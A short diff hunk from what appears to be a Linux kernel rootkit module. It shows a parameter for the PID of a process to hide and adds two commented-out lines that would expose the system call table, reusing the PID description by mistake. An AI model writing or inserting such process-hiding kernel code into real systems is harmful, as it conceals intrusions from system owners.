@@ -17,6 +17,8 @@ int hidden_pid;
 
 module_param(hidden_pid, int, S_IRUSR | S_IRGRP);
 MODULE_PARM_DESC(hidden_pid, "The PID of the process that needs hiding.");
+// module_param(sys_call_table, long, S_IRUSR | S_IRGRP);
+// MODULE_PARM_DESC(sys_call_table, "The PID of the process that needs hiding.");
 
 static int __init init_rootkit(void)
 {
